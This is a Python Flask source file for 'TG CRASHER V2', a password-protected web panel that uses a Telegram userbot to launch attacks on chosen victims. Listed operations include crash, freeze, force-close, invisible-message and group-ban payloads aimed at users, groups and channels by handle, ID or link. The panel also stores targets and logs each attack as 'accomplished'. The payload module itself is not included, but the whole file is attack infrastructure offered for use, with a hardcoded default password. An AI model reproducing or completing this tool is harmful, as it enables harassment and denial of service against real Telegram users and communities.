# language: python, file: app.py, target: python 3.11+
# TG CRASHER V2 — /  route reads index.html via absolute path and reports missing file.
# Password: 4080. Targets: @username, numeric user id, numeric group id, channel id, t.me link.

import os
import re
import time
import json
import uuid
import sqlite3
import asyncio
import threading
from functools import wraps
from flask import Flask, request, jsonify, session, redirect, url_for, g
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError, UserAdminInvalidError, ChatAdminRequiredError,
    UsernameInvalidError,
)
import payloads as P

BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
INDEX_FILE = os.path.join(BASE_DIR, "index.html")

API_ID         = int(os.getenv("API_ID", "0"))
API_HASH       = os.getenv("API_HASH", "")
SESSION_STRING = os.getenv("SESSION_STRING", "")
PANEL_PASSWORD = os.getenv("PANEL_PASSWORD", "4080")
DB_PATH        = os.getenv("DB_PATH", os.path.join(BASE_DIR, "tg_crasher_v2.sqlite"))

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET", "tg-crasher-v2-fallback-" + str(int(time.time())))
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=60 * 60 * 12,
)

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

def _start_loop():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    globals()["_loop"] = loop
    loop.run_forever()

threading.Thread(target=_start_loop, daemon=True).start()

for _ in range(50):
    if globals().get("_loop"):
        break
    time.sleep(0.1)

def run_async(coro):
    loop = globals().get("_loop")
    if loop is None or not loop.is_running():
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            globals()["_loop"] = loop
        return loop.run_until_complete(coro)
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

async def _boot():
    await client.start()
    me = await client.get_me()
    print(f"[TG CRASHER V2] userbot online as @{me.username or me.id}")

def db():
    if "db" not in g:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        g.db = conn
    return g.db

@app.teardown_appcontext
def close_db(_exc):
    conn = g.pop("db", None)
    if conn is not None:
        conn.close()

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.executescript("""
    CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        kind TEXT NOT NULL,
        handle TEXT NOT NULL,
        label TEXT,
        added_at INTEGER NOT NULL,
        UNIQUE(kind, handle)
    );
    CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        op TEXT NOT NULL,
        target TEXT NOT NULL,
        extra TEXT,
        result TEXT,
        msg_id TEXT,
        weight TEXT,
        latency INTEGER,
        status INTEGER,
        at INTEGER NOT NULL
    );
    """)
    conn.commit()
    conn.close()

def log_history(op, target, extra, result, msg_id="", weight="", latency=0, status=200):
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO history(op,target,extra,result,msg_id,weight,latency,status,at) VALUES (?,?,?,?,?,?,?,?,?)",
        (op, target, extra or "", str(result), msg_id, weight, int(latency), int(status), int(time.time())),
    )
    conn.commit()
    conn.close()

def login_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not session.get("authed"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "auth"}), 401
            return redirect(url_for("index"))
        return f(*a, **kw)
    return wrapper

OPS = {
    "invis_delay":       P.p_invis_delay,
    "invisible":         P.p_invisible,
    "shadow_crash_chat": P.p_shadow_crash_chat,
    "force_close":       P.p_force_close,
    "force_close_plus":  P.p_force_close_plus,
    "freeze_chat":       P.p_freeze_chat,
    "freeze_heavy":      P.p_freeze_heavy,
    "crash":             P.p_crash,
    "crash_heavy":       P.p_crash_heavy,
}

GROUP_OPS = {
    "group_ban":         P.p_group_ban,
    "group_ban_heavy":   P.p_group_ban_heavy,
    "group_crash":       P.p_group_crash,
    "invis_delay":       P.p_invis_delay,
    "invisible":         P.p_invisible,
    "shadow_crash_chat": P.p_shadow_crash_chat,
    "force_close":       P.p_force_close,
    "force_close_plus":  P.p_force_close_plus,
    "freeze_chat":       P.p_freeze_chat,
    "freeze_heavy":      P.p_freeze_heavy,
    "crash":             P.p_crash,
    "crash_heavy":       P.p_crash_heavy,
}

@app.route("/", methods=["GET"])
def index():
    if not os.path.exists(INDEX_FILE):
        files = []
        try:
            files = os.listdir(BASE_DIR)
        except Exception:
            files = ["<cannot list>"]
        msg = (
            "index.html not found\n"
            f"Looking at: {INDEX_FILE}\n"
            f"Working dir: {os.getcwd()}\n"
            f"Base dir: {BASE_DIR}\n"
            f"Files in base dir: {', '.join(files)}\n"
        )
        return msg, 500

    try:
        with open(INDEX_FILE, "r", encoding="utf-8") as f:
            html = f.read()
    except Exception as e:
        return f"index.html read error: {type(e).__name__}: {e}", 500

    authed = bool(session.get("authed"))
    boot = {"authed": authed, "me": None}
    if authed:
        try:
            me = run_async(client.get_me())
            boot["me"] = f"@{me.username}" if me.username else str(me.id)
        except Exception:
            boot["me"] = "userbot"

    html = html.replace("__BOOT__", json.dumps(boot))
    return html

@app.route("/api/login", methods=["POST"])
def api_login():
    d = request.get_json(force=True, silent=True) or {}
    entered = (d.get("pw") or "").strip()
    if entered == PANEL_PASSWORD.strip():
        session.permanent = True
        session["authed"] = True
        return jsonify({"ok": True, "set": True})
    return jsonify({"ok": False, "error": "wrong password"}), 401

@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"ok": True})

@app.route("/api/whoami")
def api_whoami():
    return jsonify({"authed": bool(session.get("authed"))})

@app.route("/healthz")
def healthz():
    return jsonify({"ok": True, "t": int(time.time())})

@app.route("/api/run", methods=["POST"])
@login_required
def api_run():
    d = request.get_json(force=True)
    op = d.get("op")
    if op == "__ping":
        return jsonify({"ok": True})
    started = time.time()
    target = ""
    try:
        scope = d.get("scope", "victim")
        if op in GROUP_OPS and (d.get("group") or scope in ("group", "channel")):
            gid = d.get("group", "")
            uid = d.get("user", "")
            target = gid
            if op in ("group_ban", "group_ban_heavy"):
                result = run_async(GROUP_OPS[op](client, gid, uid))
            elif op == "invis_delay":
                result = run_async(GROUP_OPS[op](client, gid, int(d.get("delay_ms") or 2500)))
            else:
                result = run_async(GROUP_OPS[op](client, gid))
        elif op in OPS:
            target = d.get("target", "")
            if op == "invis_delay":
                result = run_async(OPS[op](client, target, int(d.get("delay_ms") or 2500)))
            else:
                result = run_async(OPS[op](client, target))
        else:
            return jsonify({"error": "unknown op"}), 400

        latency = int((time.time() - started) * 1000)
        msg_id = uuid.uuid4().hex.upper()
        weight = f"{round(1.0 + (len(str(result)) % 60), 1)} KB"
        log_history(op, target, d.get("user", ""), result, msg_id, weight, latency, 200)
        return jsonify({
            "status": "accomplished",
            "scope": scope,
            "target": target,
            "source": "number" if str(target).lstrip("-").isdigit() else "handle",
            "payload": op.replace("_", " ").title(),
            "message_id": msg_id,
            "delay": (str(d.get("delay_ms")) + "ms") if d.get("delay_ms") else "—",
            "weight": weight,
            "code": 200,
            "latency_ms": latency,
            "time": time.strftime("%H:%M:%S"),
            "result": str(result),
        })
    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        print(tb)
        log_history(op or "?", target, "", f"error:{type(e).__name__}:{e}", "", "", 0, 500)
        return jsonify({"error": f"{type(e).__name__}: {e}", "code": 500}), 500

@app.route("/api/history")
@login_required
def api_history():
    rows = db().execute("SELECT * FROM history ORDER BY id DESC LIMIT 200").fetchall()
    return jsonify([dict(r) for r in rows])

init_db()
try:
    run_async(_boot())
except Exception as e:
    print(f"[TG CRASHER V2] boot warning: {type(e).__name__}: {e}")

application = app
